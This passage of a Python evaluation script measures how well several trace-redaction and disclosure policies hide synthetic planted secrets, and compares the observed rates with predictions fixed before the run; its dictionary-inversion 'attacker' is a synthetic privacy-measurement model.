    ("P9a-disclosure-view-with-payload", "P9b-disclosure-view-without-payload"),
    ("P0-raw-unredacted", "P8r-claim-closure-disclosure-over-raw"),
)


# Expectations frozen by code reading on 2026-11-12, BEFORE any execution.
# Rates are replicate-invariant; count fields are per replicate (4 traces x 6
# claims = 24 claim evaluations) and are multiplied by --replicates.
COUNT_FIELDS = frozenset({"falseSupport", "overAbstention", "falseSupportWithoutRedactionGate"})
_SURVIVING = {"claimSurvivalRate": "0.250000", "weakenedRate": "0.291667",
              "abstentionRate": "0.458333"}
PREDICTED: dict[str, dict[str, Any]] = {
    "P0-raw-unredacted": {
        "redactionRecall": "0.000000", "redactionRecallIfKeyCompromised": None,
        "claimSurvivalRate": "1.000000", "weakenedRate": "0.000000",
        "abstentionRate": "0.000000", "falseSupport": 0, "overAbstention": 0,
        "falseSupportWithoutRedactionGate": 0,
    },
    "P1-omit-secrets-default": {
        "redactionRecall": "0.625000", "redactionRecallIfKeyCompromised": None, **_SURVIVING,
        "falseSupport": 0, "overAbstention": 8, "falseSupportWithoutRedactionGate": 3,
    },
    "P2-unkeyed-digest": {
        "redactionRecall": "0.416667", "redactionRecallIfKeyCompromised": None, **_SURVIVING,
        "falseSupport": 0, "overAbstention": 8, "falseSupportWithoutRedactionGate": 3,
    },
    "P3-keyed-commitment": {
        "redactionRecall": "0.625000", "redactionRecallIfKeyCompromised": "0.416667",
        **_SURVIVING, "falseSupport": 0, "overAbstention": 8,
        "falseSupportWithoutRedactionGate": 3,
    },
    "P4-encrypted": {
        "redactionRecall": "0.625000", "redactionRecallIfKeyCompromised": "0.000000",
        **_SURVIVING, "falseSupport": 0, "overAbstention": 8,
        "falseSupportWithoutRedactionGate": 3,
    },
    "P5-encrypted-padded-64": {
        "redactionRecall": "0.625000", "redactionRecallIfKeyCompromised": "0.000000",
        **_SURVIVING, "falseSupport": 0, "overAbstention": 8,
        "falseSupportWithoutRedactionGate": 3,
    },
    "P6-metadata-only": {
        "redactionRecall": "1.000000", "redactionRecallIfKeyCompromised": None,
        "claimSurvivalRate": "0.000000", "weakenedRate": "0.000000",
        "abstentionRate": "1.000000", "falseSupport": 0, "overAbstention": 0,
        "falseSupportWithoutRedactionGate": 24,
    },
    "P7-lite-profile": {
        "redactionRecall": "0.791667", "redactionRecallIfKeyCompromised": None, **_SURVIVING,
        "falseSupport": 0, "overAbstention": 4, "falseSupportWithoutRedactionGate": 3,
    },
    "P8-claim-closure-disclosure": {
        "redactionRecall": "0.798611", "redactionRecallIfKeyCompromised": None, **_SURVIVING,
        "falseSupport": 0, "overAbstention": 8, "falseSupportWithoutRedactionGate": 3,
    },
    "P8r-claim-closure-disclosure-over-raw": {
        "redactionRecall": "0.388889", "redactionRecallIfKeyCompromised": None,
        "claimSurvivalRate": "1.000000", "weakenedRate": "0.000000",
        "abstentionRate": "0.000000", "falseSupport": 0, "overAbstention": 0,
        "falseSupportWithoutRedactionGate": 0,
    },
    "P9a-disclosure-view-with-payload": {
        "redactionRecall": "0.798611", "redactionRecallIfKeyCompromised": None,
        "claimSurvivalRate": "0.166667", "weakenedRate": "0.000000",
        "abstentionRate": "0.833333", "falseSupport": 0, "overAbstention": 4,
        "falseSupportWithoutRedactionGate": 0,
    },
    "P9b-disclosure-view-without-payload": {
        # Predicted FALSE SUPPORT: disclosure_view(include_payload=False) emits
        # "payloadOmitted": true instead of a typed "$redacted" placeholder, and the
        # prototype's _redacted() only recognises the latter; K4 has no causal-parent
        # requirement, so the dropped "parents" field does not rescue it.
        "redactionRecall": "1.000000", "redactionRecallIfKeyCompromised": None,
        "claimSurvivalRate": "0.166667", "weakenedRate": "0.000000",
        "abstentionRate": "0.833333", "falseSupport": 4, "overAbstention": 0,
        "falseSupportWithoutRedactionGate": 8,
    },
}


def _prediction_check(triple: Sequence[Mapping[str, Any]], replicates: int) -> dict[str, Any]:
    by_policy: dict[str, Any] = {}
    all_matched = True
    for row in triple:
        fields: dict[str, Any] = {}
        for name, value in PREDICTED[row["policy"]].items():
            predicted = value * replicates if name in COUNT_FIELDS else value
            matched = predicted == row[name]
            all_matched = all_matched and matched
            fields[name] = {"predicted": predicted, "observed": row[name], "match": matched}
        by_policy[row["policy"]] = fields
    return {
        "basis": "expectations frozen by code reading before execution (2026-11-12)",
        "allMatched": all_matched,
        "byPolicy": by_policy,
    }


def _code_digests(repo_root: Path) -> dict[str, str]:
    files = (
        "src/sova/trace/redaction.py",
        "src/sova/trace/writer.py",
        "src/sova/trace/reader.py",
        "src/sova/formats/package.py",
        "private/experiments/prototypes/fidelity.py",
    )
    digests = {
        name: "sha256:" + hashlib.sha256((repo_root / name).read_bytes()).hexdigest()
        for name in files
    }
    digests["experimentScript"] = "sha256:" + hashlib.sha256(Path(__file__).read_bytes()).hexdigest()
    return digests


def _inputs_document(specs: Sequence[TraceSpec], replicates: int) -> dict[str, Any]:
    planted = [
        [spec.index, item.event_kind, item.path, item.value, item.value_class]
        for spec in specs
        for item in spec.planted
    ]
    return {
        "seed": SEED,
        "replicatesPerVariant": replicates,
        "variants": list(VARIANTS),
        "traces": len(specs),
        "eventsPerTrace": len(specs[0].events),
        "plantedValuesPerTrace": len(specs[0].planted),
        "plantedValuesDigest": API.sha256_digest(API.canonical_json_bytes(planted)),
        "attackerDictionary": {
            "size": len(PIN_DICTIONARY),
            "template": "synthetic-pin-NNNN",
            "coversValueClass": "*/low",
        },
        "paddingBlockBytes": PADDING_BYTES,
        "claims": [
            {
                "id": claim.id,
                "type": claim.claim_type,
                "description": claim.description,
                "requirements": [
                    {
                        "id": item.id,
                        "eventKind": item.event_kind,
                        "truthPaths": [list(path) for path in item.truth_paths],
                        "parentKind": item.parent_kind,
                        "allowRedacted": item.allow_redacted,
                        "mandatory": item.mandatory,
                        "requireFullContent": True,
                    }
                    for item in claim.requirements
                ],
            }
            for claim in CLAIMS
        ],
        "policies": list(POLICY_IDS),
    }


def run(repo_root: Path, work_dir: Path | None, replicates: int, max_rss_bytes: int) -> dict:
    started = time.perf_counter()
    tracemalloc.start()
    specs = _trace_specs(replicates)
    tallies = {policy_id: PolicyTally() for policy_id in POLICY_IDS}
    supports: dict[tuple[str, int, str], str] = {}
    verifier_rejections = Counter()
    nonce_rng = random.Random(SEED + 1)  # deterministic nonces: reproducibility only

    with tempfile.TemporaryDirectory(
        prefix="sova-pf-exp-a-", dir=work_dir, ignore_cleanup_errors=True
    ) as raw_dir:
        work = Path(raw_dir)
        for spec in specs:
            raw = _raw_events(spec)
            raw_by_kind = {event["kind"]: event for event in raw}
            raw_digest = API.sha256_digest(API.canonical_json_bytes(raw))

            for event in raw:  # would the shipped reader accept unredacted payloads?
                try:
                    API.RedactionVerifier().verify(event["payload"], [])
                except API.FormatError:
                    verifier_rejections["rejected"] += 1
                else:
                    verifier_rejections["accepted"] += 1

            views: list[ExportView] = [
                ExportView(
                    "P0-raw-unredacted", None, raw, COUNTERFACTUAL_MANIFEST, True,
                    _json_bytes(raw), None,
                ),
            ]
            digest_events = _unkeyed_digest_events(raw)
            views.append(
                ExportView(
                    "P2-unkeyed-digest", None, digest_events, COUNTERFACTUAL_MANIFEST, True,
                    _json_bytes(digest_events), None,
                )
            )
            p1_reader = p1_events = p1_manifest = None
            p1_path: Path | None = None
            for policy_id in WRITER_POLICIES:
                path = _write_trace(work, spec, policy_id)
                reader, events, manifest, valid = _read_trace(path)
                views.append(
                    ExportView(
                        policy_id, None, events, manifest, valid, _zip_bytes(path),
                        manifest.get("id") if manifest else None,
                    )
                )
                if policy_id == "P1-omit-secrets-default":
                    p1_reader, p1_events, p1_manifest, p1_path = reader, events, manifest, path
            if p1_reader is None or p1_path is None or not p1_events:
                raise RuntimeError(f"P1 trace {spec.index} failed verification; cannot derive P8/P9")
            p1_digest = API.sha256_digest(p1_path.read_bytes())
            for claim in CLAIMS:
                views.append(
                    _bundle_view(
                        "P8-claim-closure-disclosure", claim, p1_events, p1_manifest,
                        p1_digest, nonce_rng,
                    )
                )
                views.append(
                    _bundle_view(
                        "P8r-claim-closure-disclosure-over-raw", claim, raw,
                        COUNTERFACTUAL_MANIFEST, raw_digest, nonce_rng,
                    )
                )
                views.append(
                    _disclosure_view(
                        "P9a-disclosure-view-with-payload", claim, p1_reader, p1_events,
                        p1_manifest, include_payload=True,
                    )
                )
                views.append(
                    _disclosure_view(
                        "P9b-disclosure-view-without-payload", claim, p1_reader, p1_events,
                        p1_manifest, include_payload=False,
                    )
                )
            for view in views:
                _evaluate_view(view, spec, raw_by_kind, tallies[view.policy_id], supports)
            _memory_guard(max_rss_bytes)

    claim_types = sorted({claim.claim_type for claim in CLAIMS})
    per_policy: list[dict[str, Any]] = []
    triple: list[dict[str, Any]] = []
    for policy in POLICIES:
        tally = tallies[policy["id"]]
        recall = _recall_block(tally.planted, tally.hidden)
        compromised = (
            _recall_block(tally.planted, tally.hidden_if_compromised)
            if policy["id"] in COMPROMISE_POLICIES
            else None
        )
        decisions = _decision_block(tally.decisions)
        safety = _safety_block(tally.pairs)
        ablation_safety = _safety_block(tally.ablation_pairs)
        per_policy.append(
            {
                **policy,
                "exports": tally.exports,
                "integrityInvalidExports": tally.verification_failures,
                "redaction": {
                    **recall,
                    "recoveryRoutes": dict(sorted(tally.routes.items())),
                    "ifKeyCompromised": None
                    if compromised is None
                    else {**compromised, "recoveryRoutes": dict(sorted(tally.routes_if_compromised.items()))},
                },
                "decisions": decisions,
                "decisionsByClaimType": {
                    claim_type: _decision_block(tally.decisions, claim_type)
                    for claim_type in claim_types
                },
                "truth": _decision_block(tally.truths),
                "truthByClaimType": {
                    claim_type: _decision_block(tally.truths, claim_type)
                    for claim_type in claim_types
                },
                "safety": safety,
                "ablationNoRedactionGate": {
                    "decisions": _decision_block(tally.ablation),
                    "decisionsByClaimType": {
                        claim_type: _decision_block(tally.ablation, claim_type)
                        for claim_type in claim_types
                    },
                    "safety": ablation_safety,
                },
            }
        )
        triple.append(
            {
                "policy": policy["id"],
                "sovaImplements": policy["sovaImplements"],
                "redactionRecall": recall["recall"],
                "redactionRecallIfKeyCompromised": None if compromised is None else compromised["recall"],
                "claimSurvivalRate": decisions["claimSurvivalRate"],
                "weakenedRate": decisions["weakenedRate"],
                "abstentionRate": decisions["abstentionRate"],
                "falseSupport": safety["falseSupport"],
                "overAbstention": safety["overAbstention"],
                "falseSupportWithoutRedactionGate": ablation_safety["falseSupport"],
            }
        )

    monotonicity = []
    for richer, poorer in MONOTONICITY_PAIRS:
        increases = equal = decreases = 0
        for spec in specs:
            for claim in CLAIMS:
                left = supports[(richer, spec.index, claim.id)]
                right = supports[(poorer, spec.index, claim.id)]
                if SUPPORT_RANK[right] > SUPPORT_RANK[left]:
                    increases += 1
                elif SUPPORT_RANK[right] == SUPPORT_RANK[left]:
                    equal += 1
                else:
                    decreases += 1
        monotonicity.append(
            {
                "moreEvidence": richer,
                "lessEvidence": poorer,
                "supportIncreased": increases,
                "supportUnchanged": equal,
                "supportDecreased": decreases,
            }
        )

    _current, traced_peak = tracemalloc.get_traced_memory()
    tracemalloc.stop()
    inputs = _inputs_document(specs, replicates)
    stable = {"triple": triple, "perPolicy": per_policy, "monotonicity": monotonicity}
    return {
        "artifactType": ARTIFACT_TYPE,
        "schemaVersion": SCHEMA_VERSION,
        "generatedAt": datetime.now(UTC).isoformat().replace("+00:00", "Z"),
        "status": "same-team constructed deterministic study; designed before execution",
        "environment": {
            "python": platform.python_version(),
            "implementation": platform.python_implementation(),
            "platform": platform.platform(),
            "sovaVersion": API.sova_version,
            "networkUsed": False,
            "modelUsed": False,
            "providerUsed": False,
        },
        "inputs": inputs,
        "inputsDigest": API.sha256_digest(API.canonical_json_bytes(inputs)),
        "codeDigests": _code_digests(repo_root),
        "triple": triple,
        "perPolicy": per_policy,
        "monotonicity": monotonicity,
        "predictionCheck": _prediction_check(triple, replicates),
        "readerResidualSecretCheckOnRawEvents": dict(verifier_rejections),
        "deterministicResultDigest": API.sha256_digest(API.canonical_json_bytes(stable)),
        "resourceUse": {
            "wallSeconds": f"{time.perf_counter() - started:.3f}",
            "tracemallocPeakBytes": traced_peak,
            "processPeakWorkingSetBytes": _peak_working_set_bytes(),
            "guardBytes": max_rss_bytes,
        },
        "notes": [
            "Redaction recall counts a planted value as recoverable if its exact UTF-8 bytes "
            "occur in the decompressed export, or if a 100-entry low-entropy dictionary "
            "inverts an unkeyed digest. High-entropy values are assumed not enumerable.",
            "'If key compromised' assumes the attacker holds the commitment or encryption key "
            "and the public trace id (keyed-commitment context); encrypted placeholders are "
            "decrypted with sova.trace.redaction.decrypt_placeholder.",
            "Ground truth is path-level: a claim's mandatory evidence is available only if the "
            "exact planted payload value at each declared path is present in the export, or a "
            "typed placeholder is present and the claim tolerates redaction. The assessor "
            "(prototype assess_fidelity) is event-level.",
            "For claim-bundle exports (P8, P8r, P9a, P9b) recall denominators are "
            "planted values x claims, because each claim yields a separate export.",
            "P9a/P9b model a naive receiver that accepts the unsigned disclosure view as "
            "integrity-valid; a conservative receiver would set integrity_valid=False and "
            "every claim would become inconclusive.",
            "Disclosure nonces are drawn from a seeded RNG for reproducibility; real use "
            "requires a CSPRNG, and recall for undisclosed events assumes nonces stay secret.",
            "Monotonicity rows compare support for the same trace and claim between a "
            "richer and a poorer evidence export; 'supportIncreased' must be 0.",
            "Trace ids, event ids, wall times and AES-GCM nonces are random per run; all "
            "reported counts and rates are designed to be run-invariant and are bound by "
            "deterministicResultDigest.",
        ],
        "limitations": [
            "Same-team construction: corpus, claims, ground-truth rules and assessor were "
            "authored by the same team. Event-presence, count and causal-parent truth rules "
            "mirror the assessor and agree by construction; only path-level content "
            "availability, representation boundaries and detector misses are informative.",
            "Claim-conditioned fidelity and causal-closure disclosure are private prototypes, "
            "not the shipped sova package; the paper's payload-path and observation-role "
            "requirements (section 4.3) are not implemented by the prototype.",
            "P0, P2 and P8r are counterfactual baselines SOVA does not implement.",
            "The detector is the shipped best-effort regex; generic sensitive strings are a "
            "known false negative and are counted, not hidden.",
            "Structural, length-bucket, path, presence and linkage leakage are outside "
            "redaction recall; see the Topic 05 privacy attack study.",
            "Not a privacy audit, cryptographic proof, or field estimate.",
        ],
    }


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("output", type=Path, help="result JSON path")
    parser.add_argument("--repo-root", type=Path, default=Path.cwd())
    parser.add_argument("--work-dir", type=Path, default=None, help="parent for temp traces")
    parser.add_argument("--replicates", type=int, default=DEFAULT_REPLICATES)
    parser.add_argument("--max-rss-mb", type=int, default=300)
    args = parser.parse_args()
    if not 1 <= args.replicates <= 64:
        raise SystemExit("--replicates must be between 1 and 64")
    repo_root = args.repo_root.resolve()
    _bootstrap(repo_root)
    result = run(repo_root, args.work_dir, args.replicates, args.max_rss_mb * 1024 * 1024)
    args.output.parent.mkdir(parents=True, exist_ok=True)
    args.output.write_text(
        json.dumps(result, indent=2, sort_keys=True, ensure_ascii=False) + "\n",
        encoding="utf-8",
        newline="\n",
    )
    print(args.output)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
